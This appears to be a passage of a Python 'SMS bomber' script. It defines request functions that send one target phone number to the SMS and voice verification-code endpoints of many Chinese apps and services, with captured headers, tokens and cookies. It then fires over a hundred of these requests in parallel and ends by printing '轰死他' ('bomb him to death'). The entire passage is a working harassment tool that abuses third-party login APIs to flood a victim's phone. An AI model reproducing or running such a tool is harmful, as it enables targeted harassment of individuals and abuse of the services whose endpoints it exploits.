    "accessToken": "WyI5MjlFNUUyQ0Q4RjkxRDlCLUEwQjkyMzgyMERDQzUwOUEtMjE0NDMyNzEzIiwiOTI5RTVFMkNEOEY5MUQ5Qi1BMEI5MjM4MjBEQ0M1MDlBLTIxNDQzMjcxMyJd;0;ZXlKMGVYQmxJam9pZEdGeWIxOTNaV0Z3Y0NJc0ltMXZaR1ZzSWpvaWJXbGpjbTl6YjJaMElpd2ljM2x6ZEdWdElqb2lWMmx1Wkc5M2N5QXhNQ0I0TmpRaUxDSmhjSEJmYm1GdFpTSTZJbXhsWm05NExXOW1abWxqYVdGc0xXMXBibWx3Y205bmNtRnRJaXdpZG1WeWMybHZiaUk2SWpFdU1qa3VOaUlzSW5ObGNtbGhiRTVQSWpvaWIxOWxNMm8wYkU1cmIxaDZaVGxXWWtSeVdIRXlSMll4YVVwbmF5SXNJbUZqWTI5MWJuUkpSQ0k2SWpreU9VVTFSVEpEUkRoR09URkVPVUl0UVRCQ09USXpPREl3UkVORE5UQTVRUzB5TVRRME16STNNVE1pTENKemFXZHVJam9pWm1FeU1XVmpPV1l3WW1VMk1qQXdaakZtWVRNek5EbGhPVGt6WkRJMk9XRWlmUT09;Ym5Wc2JBbz0=;;W10=;240d8fe412d77294dfdef557cd30de9d34b6c5a95b2642656419d620503ffb53ae2d23eb8d1de7a0afb165aa181e35c6786d9ae8f2ac137f8fd7d39051e6cfc1",
    "Referrer-Policy": "origin",
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36 MicroMessenger/7.0.20.1781(0x6700143B) NetType/WIFI MiniProgramEnv/Windows WindowsWechat/WMPF WindowsWechat(0x6309062b) XWEB/9105",
    "Content-Type": "application/json;charset=UTF-8",
    "xweb_xhr": "1",
    "alipayopenid": "",
    "deviceModel": "microsoft",
    "Accept": "*/*",
    "Sec-Fetch-Site": "cross-site",
    "Sec-Fetch-Mode": "cors",
    "Sec-Fetch-Dest": "empty",
    "Referer": "https://servicewechat.com/wx82028cdb701506f3/181/page-frame.html",
    "Accept-Encoding": "gzip, deflate, br",
    "Accept-Language": "zh-CN,zh;q=0.9"
}

    data125 = {
    "mobileCodeType": "mobileLogin",
    "mobileNo": phone,
    "sign": "md5sign",
    "timeStamp": "1713177231575",
    "deviceId": "Bkm9UNmPJJnDQ+JUmFhfc+gHKSId9U/vXW6S1Fremx0ex4JnwRIcgGva0jXeA1hFmgCHgjsSYh1ZcYUwXv+tufw==",
    "rid": ""
}
    response125 = requests.post(url125, headers=headers125, data=data125)
    
def request_url126():
    url126 = "https://vipainisheng.com/user/app/open/user/sendSms"
    headers126 = {
    "Host": "vipainisheng.com",
    "Connection": "keep-alive",
    "Content-Length": "302",
    "xweb_xhr": "1",
    "loginDevictType": "XCX",
    "cookie": "",
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36 MicroMessenger/7.0.20.1781(0x6700143B) NetType/WIFI MiniProgramEnv/Windows WindowsWechat/WMPF WindowsWechat(0x6309062b) XWEB/9105",
    "Content-Type": "application/json;charset=UTF-8",
    "Accept": "*/*",
    "Sec-Fetch-Site": "cross-site",
    "Sec-Fetch-Mode": "cors",
    "Sec-Fetch-Dest": "empty",
    "Referer": "https://servicewechat.com/wx5f198a7cd2798103/8/page-frame.html",
    "Accept-Encoding": "gzip, deflate, br",
    "Accept-Language": "zh-CN,zh;q=0.9"
}
    data126 = {
    "jmxygtz": "",
    "vcVersionCode": "1.6.2",
    "language": "zh_CN",
    "loginDevictType": "XCX",
    "appCode": "JS",
    "xcxAppId": "wx5f198a7cd2798103",
    "mobile": phone,
    "affairType": 1,
    "area": "+86",
    "en": "Hf5FRgv5tjYBW5FIgJG6Mpp94VaqgFNVugxYQks0Us67L2ujaFcjOWRMVj1V4swL/rVe5ADkyXimIJ53T194Fg==",
    "uuid": "",
    "captchaCode": ""
}

    response126 = requests.post(url126, headers=headers126, data=data126)

def request_url127():
    url127 = "https://mobilev2.atomychina.com.cn/api/user/web/login/login-send-sms-code"
    headers127 = {
    "Host": "mobilev2.atomychina.com.cn",
    "Connection": "keep-alive",
    "Content-Length": "68",
    "pragma": "no-cache",
    "design-site-locale": "zh-CN",
    "Accept-Language": "zh-CN",
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36 MicroMessenger/7.0.20.1781(0x6700143B) NetType/WIFI MiniProgramEnv/Windows WindowsWechat/WMPF WindowsWechat(0x6309062b) XWEB/9105",
    "X-HTTP-REQUEST-DOMAIN": "mobilev2.atomychina.com.cn",
    "Content-Type": "application/json",
    "Accept": "application/json",
    "cache-control": "no-cache",
    "xweb_xhr": "1",
    "x-requested-with": "XMLHttpRequest",
    "cookie": "acw_tc=0b6e702e17131629263394156e104b9681bb7f7854d38d5dfc0dff560ade54; guestId=01e7996e-454f-4bab-bd84-44b6d2277113; 15 Apr 2025 06:35:26 GMT; guestId.sig=jWFSrGBOhFwEfFZJbEoMSYkDoO8; 15 Apr 2025 06:35:50 GMT; 15 Apr 2025 06:35:52 GMT",
    "Sec-Fetch-Site": "cross-site",
    "Sec-Fetch-Mode": "cors",
    "Sec-Fetch-Dest": "empty",
    "Referer": "https://servicewechat.com/wx74d705d9fabf5b77/97/page-frame.html",
    "Accept-Encoding": "gzip, deflate, br"
}
    data127 = {
    "mobile": phone,
    "captcha": "1111",
    "token": "1111",
    "prefix": 86
}

    response127 = requests.post(url127, headers=headers127, data=data127)
    
def request_url128():
    url128 = f"https://user.yunjiglobal.com/yunjiuserapp/userapp/generateVoiceSmsCode.json?phone=86{phone}&appCont=1"
    response128 = requests.get(url128)
    
def request_url129():
    
    data129 = {"phone": phone}
    headers129 = {
    "Host": "community.lishuizongzhi.com",
    "Connection": "keep-alive",
    "Content-Length": "23",
    "accesstoken": "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJvcGVuSWQiOiJvOHpBNjVibzFVMDhwdGlxRkJTMmd0VGgwaTZBIiwiYXBwSWQiOiJ3eDI4ZWUyYjdlYzExOTFjMzEiLCJsb2dpblRpbWUiOjE3MTExOTIwNzAyOTd9.m2nzRIQMVmcET1VuyYJLmuTjZtuTAUwY1QwZSnVX0RM",
    "companyNo": "",
    "houseId": "",
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36 MicroMessenger/7.0.20.1781(0x6700143B) NetType/WIFI MiniProgramEnv/Windows WindowsWechat/WMPF WindowsWechat(0x6309062b) XWEB/9079",
    "Content-Type": "application/json",
    "xweb_xhr": "1",
    "neighNo": "",
    "version": "1.4.6",
    "Accept": "*/*",
    "Sec-Fetch-Site": "cross-site",
    "Sec-Fetch-Mode": "cors",
    "Sec-Fetch-Dest": "empty",
    "Referer": "https://servicewechat.com/wx28ee2b7ec1191c31/20/page-frame.html",
    "Accept-Encoding": "gzip, deflate, br",
    "Accept-Language": "zh-CN,zh;q=0.9",
}

    url129 = "https://community.lishuizongzhi.com/wx-life/mc/auth/code"

    response129 = requests.post(url129, json=data129, headers=headers129)
    
def request_url130():
    url130 = f"https://card.10010.com/ko-order/messageCaptcha/send?phoneVal={phone}"
    response130 = requests.get(url130)
    
def request_url131():
    url131 = "https://igetcool-gateway.igetcool.com/app-api-user-server/white/sms/voice.json?phone={phone}&smstype=1"
    response131 = requests.get(url131)

def request_url132():
    url132 = "https://delivery-api.imdada.cn/v2_0/account/sendVoiceSMSCode/?phone={phone}&type=2"
    response132 = requests.get(url132)
def request_url133():
    url133 = 'https://api-smart.ddzuwu.com/api/users/login/send-sms'
    headers133 = {
    'Host': 'api-smart.ddzuwu.com',
    'Content-Type': 'application/x-www-form-urlencoded',
    'Accept': 'application/json',
    'Connection': 'keep-alive',
    'Platform': '1',
    'Models': 'iPhone12,1',
    'Version': '2.8.7',
    'User-Agent': 'dingdongzuwu/2.8.7 (iPhone; iOS 16.6.1; Scale/2.00)',
    'Accept-Language': 'zh-Hans-CN;q=1',
    'Accept-Encoding': 'gzip, deflate, br'
}

    data133 = {'phone': phone}

    response133 = requests.post(url133, headers=headers133, data=data133)

def request_url134():
    url134 = 'https://api.boxtrip.vip/v1/api/sms/login'
    headers134 = {
    'Host': 'api.boxtrip.vip',
    'Accept': '*/*',
    'version': '1.2.4',
    'Accept-Encoding': 'gzip, deflate, br',
    'Accept-Language': 'zh-CN,zh-Hans;q=0.9',
    'platform': 'ios',
    'signature': '2143352315',
    'Content-Length': '24',
    'User-Agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 16_6_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 Html5Plus/1.0 (Immersed/44) uni-app',
    'Connection': 'keep-alive',
    'Content-Type': 'application/json',
    'deviceBrand': 'iphone'
}


    data134 = {'mobile': phone}

    response134 = requests.post(url134, headers=headers134, data=json.dumps(data134))

def request_url135():
    url135 = 'https://anmo.jiudiananmo.com/index.php?i=666&t=0&v=3.0&from=wxapp&c=entry&a=wxapp&do=api&core=core2&m=longbing_massages_city&s=massage/app/Index/sendShortMsg&urls=massage/app/Index/sendShortMsg'
    headers135 = {
    'Host': 'anmo.jiudiananmo.com',
    'Content-Type': 'application/json;charset=utf-8',
    'Accept': '*/*',
    'Accept-Encoding': 'gzip, deflate, br',
    'Connection': 'keep-alive',
    'market': '8',
    'isapp': '1',
    'User-Agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 16_6_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 Html5Plus/1.0 (Immersed/44) uni-app',
    'autograph': '',
    'Content-Length': '23',
    'Accept-Language': 'zh-CN,zh-Hans;q=0.9'
}


    data135 = {'phone': phone}

    response135 = requests.post(url135, headers=headers135, data=json.dumps(data135))
    
def request_url136():
   
    url136 = "https://api.dingdong.lrswlkj.com/auth/sendLoginMobileCode"
    headers136 = {
    "Host": "api.dingdong.lrswlkj.com",
    "Content-Type": "application/json",
    "Accept-Encoding": "gzip, deflate, br",
    "Connection": "keep-alive",
    "Accept": "*/*",
    "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 16_6_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 Html5Plus/1.0 (Immersed/44) uni-app",
    "Content-Length": "33",
    "token": "",
    "Accept-Language": "zh-CN,zh-Hans;q=0.9"
}
    data136 = {
    "mobile": phone,
    "type": 0
}

    response136 = requests.post(url136, headers=headers136, json=data136)   
    
def request_url137():
    url137 = "https://mgr.moyunk.com/api/appAuth/smsCode"
    headers137 = {
    "Host": "mgr.moyunk.com",
    "Content-Type": "application/json",
    "Connection": "keep-alive",
    "Accept": "*/*",
    "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 16_6_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 Html5Plus/1.0 (Immersed/44) uni-app",
    "Content-Length": "24",
    "Accept-Language": "zh-CN,zh-Hans;q=0.9",
    "Accept-Encoding": "gzip, deflate, br"
}
    data137 = {
    "mobile": phone
}

    response137 = requests.post(url137, headers=headers137, json=data137)
    
def request_url138():
    url138 = "https://api.jishizhijia.com/technician-home/login/sendMsg"
    headers138 = {
    "Host": "api.jishizhijia.com",
    "Content-Type": "application/json;charset=UTF-8",
    "Connection": "keep-alive",
    "Accept": "*/*",
    "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 16_6_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 Html5Plus/1.0 (Immersed/44) uni-app",
    "Content-Length": "21",
    "Accept-Language": "zh-CN,zh-Hans;q=0.9",
    "Accept-Encoding": "gzip, deflate, br"
}
    data138 = {
    "tel": phone
}

    response138 = requests.post(url138, headers=headers138, json=data138)
    
def request_url139():
    url139 = "https://api.tuituidj.com/h5/customer/loginSms"
    headers139 = {
    "Host": "api.tuituidj.com",
    "system": "ios",
    "Accept": "*/*",
    "channel": "",
    "version": "1033",
    "Accept-Language": "zh-CN,zh-Hans;q=0.9",
    "Accept-Encoding": "gzip, deflate, br",
    "platform": "APP",
    "Content-Type": "application/json;charset=UTF-8",
    "Content-Length": "23",
    "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 16_6_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 Html5Plus/1.0 (Immersed/44) uni-app",
    "Connection": "keep-alive"
}
    data139 = {
    "phone": phone
}

    response139 = requests.post(url139, headers=headers139, json=data139)    
def request_url140():
    url140 = "https://api.meipao.vip/make_rider/v1/send_provider_sms"
    headers140 = {
    "Host": "api.meipao.vip",
    "Content-Type": "application/x-www-form-urlencoded;charset=utf-8",
    "Accept-Encoding": "gzip, deflate, br",
    "Connection": "keep-alive",
    "Accept": "application/json",
    "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 16_6_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 Html5Plus/1.0 (Immersed/44) uni-app",
    "Authorization": "bearer undefined",
    "Content-Length": "58",
    "Accept-Language": "zh-CN,zh-Hans;q=0.9"
}
    data140 = {
    "mobile": phone,
    "type": "rider_login",
    "m": "make_rider",
    "uniacid": "0"
}

    response140 = requests.post(url140, headers=headers140, data=data140)
    
def request_url141():
    url141 = "https://open.iconntech.com/unifyUser/sendMsg"
    headers141 = {
    "Host": "open.iconntech.com",
    "Content-Type": "application/json",
    "Connection": "keep-alive",
    "Accept": "*/*",
    "User-Agent": "HZCitizenCardapp/6.7.6 (iPhone; iOS 16.6.1; Scale/2.00)",
    "Accept-Language": "zh-Hans-CN;q=1",
    "Content-Length": "39",
    "Accept-Encoding": "gzip, deflate, br"
}
    data141 = {
    "msgType": "01",
    "mobile": phone
}

    response141 = requests.post(url141, headers=headers141, json=data141)
def request_url142():
    url142 = "https://app.dianjingjob.com/api/v1/5f8aa4831930c"
    headers142 = {
    "Host": "app.dianjingjob.com",
    "appid": "91562284",
    "Accept": "*/*",
    "timestamp": "1714822056",
    "signaturenonce": "6f2fda6d4a10c1ee6373a33ff46637f8a1fa4929",
    "Accept-Language": "zh-CN,zh-Hans;q=0.9",
    "Accept-Encoding": "gzip, deflate, br",
    "signature": "a4ae58d89f0df0e7166be4371c0b2d944f4699d9",
    "Content-Type": "application/json",
    "Content-Length": "47",
    "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 16_6_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 Html5Plus/1.0 (Immersed/44) uni-app",
    "Connection": "keep-alive"
}
    data142 = {
    "is_test": 0,
    "mobile": phone,
    "type": "1"
}

    response142 = requests.post(url142, headers=headers142, json=data142)
def request_url143():
    url143 = "https://xnvfgk.sjrjyffs.top/api/app/sms/getcode"
    headers143 = {
    "Host": "xnvfgk.sjrjyffs.top",
    "Content-Type": "application/json",
    "userType": "app_user",
    "Accept": "*/*",
    "Connection": "keep-alive",
    "Content-Length": "44",
    "User-Agent": "GGTravelGuide/1.2.8 (com.TravelGuide.success; build:1; iOS 16.6.1) Alamofire/5.7.1",
    "Accept-Language": "zh-Hans-CN;q=1.0",
    "Authorization": "Bearer noToken",
    "Accept-Encoding": "br;q=1.0, gzip;q=0.9, deflate;q=0.8"
}


    data143 = {
    "systemType": 4,
    "phonenumber": phone
}

    response143 = requests.post(url143, headers=headers143, json=data143)
with ThreadPoolExecutor() as executor:
    executor.submit(request_url1)
    executor.submit(request_url2)
    executor.submit(request_url3)
    executor.submit(request_url4)
    executor.submit(request_url5)
    executor.submit(request_url6)
    executor.submit(request_url7)
    executor.submit(request_url8)
    executor.submit(request_url9)
    executor.submit(request_url10)
    executor.submit(request_url11)    
    executor.submit(request_url12)
    executor.submit(request_url13)
    executor.submit(request_url14)
    executor.submit(request_url15)
    executor.submit(request_url16)
    executor.submit(request_url17)
    executor.submit(request_url18)
    executor.submit(request_url19)
    executor.submit(request_url20)
    executor.submit(request_url21)
    executor.submit(request_url22)
    executor.submit(request_url23)
    executor.submit(request_url26)
    executor.submit(request_url27)
    executor.submit(request_url28)
    executor.submit(request_url29)
    executor.submit(request_url30)
    executor.submit(request_url31)
    executor.submit(request_url32)
    executor.submit(request_url33)
    executor.submit(request_url100)
    executor.submit(request_url34)
    executor.submit(request_url35)
    executor.submit(request_url36)
    executor.submit(request_url37)
    executor.submit(request_url38)
    executor.submit(request_url39)
    executor.submit(request_url40)    
    executor.submit(request_url41)
    executor.submit(request_url42)
    executor.submit(request_url43)
    executor.submit(request_url44)
    executor.submit(request_url45)
    executor.submit(request_url46)
    executor.submit(request_url47)
    executor.submit(request_url48)
    executor.submit(request_url49)
    executor.submit(request_url50)
    executor.submit(request_url51)
    executor.submit(request_url52)
    executor.submit(request_url53)
    executor.submit(request_url54)
    executor.submit(request_url55)
    executor.submit(request_url56)
    executor.submit(request_url57)
    executor.submit(request_url58)
    executor.submit(request_url59)
    executor.submit(request_url60)
    executor.submit(request_url61)
    executor.submit(request_url62)
    executor.submit(request_url63)
    executor.submit(request_url64)
    executor.submit(request_url65)
    executor.submit(request_url66)
    executor.submit(request_url67)
    executor.submit(request_url68)
    executor.submit(request_url69)
    executor.submit(request_url70)
    executor.submit(request_url71)
    executor.submit(request_url72)
    executor.submit(request_url73)
    executor.submit(request_url74)
    executor.submit(request_url75)
    executor.submit(request_url76)
    executor.submit(request_url77)
    executor.submit(request_url78)
    executor.submit(request_url79)
    executor.submit(request_url80)
    executor.submit(request_url81)
    executor.submit(request_url82)
    executor.submit(request_url83)
    executor.submit(request_url84)
    executor.submit(request_url85)
    executor.submit(request_url86)
    executor.submit(request_url87)
    executor.submit(request_url88)
    executor.submit(request_url89)
    executor.submit(request_url90)
    executor.submit(request_url91)
    executor.submit(request_url92)
    executor.submit(request_url93)
    executor.submit(request_url94)
    executor.submit(request_url95)
    executor.submit(request_url96)
    executor.submit(request_url97)
    executor.submit(request_url98)
    executor.submit(request_url99)
    executor.submit(request_url101)
    executor.submit(request_url102)
    executor.submit(request_url103)
    executor.submit(request_url104)
    executor.submit(request_url105)
    executor.submit(request_url106)
    executor.submit(request_url107)
    executor.submit(request_url108)
    executor.submit(request_url109)
    executor.submit(request_url110)
    executor.submit(request_url111)
    executor.submit(request_url112)
    executor.submit(request_url113)
    executor.submit(request_url114)
    executor.submit(request_url115)
    executor.submit(request_url116)
    executor.submit(request_url117)
    executor.submit(request_url118)
    executor.submit(request_url119)
    executor.submit(request_url121)
    executor.submit(request_url122)
    executor.submit(request_url123)
    executor.submit(request_url124)
    executor.submit(request_url125)
    executor.submit(request_url126)
    executor.submit(request_url127)
    executor.submit(request_url128)
    executor.submit(request_url129)
    executor.submit(request_url130)
    executor.submit(request_url131)
    executor.submit(request_url132)
    executor.submit(request_url133)
    executor.submit(request_url134)
    executor.submit(request_url135)
    executor.submit(request_url136)
    executor.submit(request_url137)
    executor.submit(request_url138)
    executor.submit(request_url139)
    executor.submit(request_url140)
    executor.submit(request_url141)
    executor.submit(request_url142)
    executor.submit(request_url143)
print("----------------------------------")
print("轰死他😭")